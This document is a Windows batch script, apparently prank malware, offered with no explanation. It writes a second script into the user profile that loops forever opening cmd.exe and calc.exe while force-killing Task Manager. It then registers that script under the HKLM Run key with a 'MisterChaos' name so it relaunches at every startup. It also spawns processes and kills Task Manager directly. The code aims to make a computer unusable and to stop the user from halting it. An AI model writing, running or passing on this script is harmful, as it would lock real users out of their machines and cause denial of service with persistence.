@echo off
echo @echo off >> %userprofile%\spamprocess_permacrashREG.bat
echo :loop >> %userprofile%\spamprocess_permacrashREG.bat
echo start cmd.exe >> %userprofile%\spamprocess_permacrashREG.bat
echo taskkill /im taskmgr.exe /f /t >> %userprofile%\spamprocess_permacrashREG.bat
echo start calc.exe >> %userprofile%\spamprocess_permacrashREG.bat
start cmd.exe >> %userprofile%\spamprocess_permacrashREG.bat
taskkill /im taskmgr.exe /f /t >> %userprofile%\spamprocess_permacrashREG.bat
start calc.exe >> %userprofile%\spamprocess_permacrashREG.bat
start cmd.exe >> %userprofile%\spamprocess_permacrashREG.bat
taskkill /im taskmgr.exe /f /t >> %userprofile%\spamprocess_permacrashREG.bat
start calc.exe >> %userprofile%\spamprocess_permacrashREG.bat
start cmd.exe >> %userprofile%\spamprocess_permacrashREG.bat
taskkill /im taskmgr.exe /f /t >> %userprofile%\spamprocess_permacrashREG.bat
start calc.exe >> %userprofile%\spamprocess_permacrashREG.bat
start cmd.exe >> %userprofile%\spamprocess_permacrashREG.bat
taskkill /im taskmgr.exe /f /t >> %userprofile%\spamprocess_permacrashREG.bat
start calc.exe >> %userprofile%\spamprocess_permacrashREG.bat
start cmd.exe >> %userprofile%\spamprocess_permacrashREG.bat
taskkill /im taskmgr.exe /f /t >> %userprofile%\spamprocess_permacrashREG.bat
start calc.exe >> %userprofile%\spamprocess_permacrashREG.bat
start cmd.exe >> %userprofile%\spamprocess_permacrashREG.bat
taskkill /im taskmgr.exe /f /t >> %userprofile%\spamprocess_permacrashREG.bat
start calc.exe >> %userprofile%\spamprocess_permacrashREG.bat
start cmd.exe >> %userprofile%\spamprocess_permacrashREG.bat
taskkill /im taskmgr.exe /f /t >> %userprofile%\spamprocess_permacrashREG.bat
start calc.exe >> %userprofile%\spamprocess_permacrashREG.bat
start cmd.exe >> %userprofile%\spamprocess_permacrashREG.bat
taskkill /im taskmgr.exe /f /t >> %userprofile%\spamprocess_permacrashREG.bat
start calc.exe >> %userprofile%\spamprocess_permacrashREG.bat
start cmd.exe >> %userprofile%\spamprocess_permacrashREG.bat
taskkill /im taskmgr.exe /f /t >> %userprofile%\spamprocess_permacrashREG.bat
start calc.exe >> %userprofile%\spamprocess_permacrashREG.bat
start cmd.exe >> %userprofile%\spamprocess_permacrashREG.bat
taskkill /im taskmgr.exe /f /t >> %userprofile%\spamprocess_permacrashREG.bat
start calc.exe >> %userprofile%\spamprocess_permacrashREG.bat
start cmd.exe >> %userprofile%\spamprocess_permacrashREG.bat
taskkill /im taskmgr.exe /f /t >> %userprofile%\spamprocess_permacrashREG.bat
start calc.exe >> %userprofile%\spamprocess_permacrashREG.bat
goto loop >> %userprofile%\spamprocess_permacrashREG.bat

REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V MisterChaos%random% /T REG_SZ /D "%userprofile%\spamprocess_permacrashREG.bat" /F